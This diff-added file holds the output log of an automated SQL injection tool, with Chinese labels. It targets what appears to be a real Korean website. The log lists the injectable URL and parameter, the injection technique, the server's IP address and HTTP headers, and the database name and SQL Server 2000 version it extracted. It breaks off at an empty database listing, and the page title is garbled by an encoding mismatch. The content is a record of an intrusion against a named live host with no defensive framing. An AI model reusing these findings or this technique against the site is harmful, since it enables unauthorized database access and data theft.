@@ -1,0 +1,37 @@
+■漏洞信息:============================================================
+ ·URL:http://www.ting9.kr/client/client.asp?page=1&code=&m=%BA%CE%BB%EA
+ ·页面标题：-绕巢,肯家巢,倔炉,等厘赤,1:1固泼,盲泼,傍楷单捞飘,巩磊模备,模备荤蓖扁
+ ·参数:page=1&code=&m=%BA%CE%BB%EA
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.43.212.168
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Length: 41515
+Content-Type: text/html
+Server: Microsoft-IIS/7.5
+Set-Cookie: ASPSESSIONIDAADSQRRS=KNJLFENDFIAKKAHGBMJLKEOK; path=/
+X-Powered-By: ASP.NET
+Date: Sun, 03 Apr 2011 11:19:49 GMT
+Connection: close
+
+
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:ting9
+ ·版本:Microsoft SQL Server  2000 - 8.00.2055 (Intel X86) 
+	Dec 16 2008 19:46:53 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
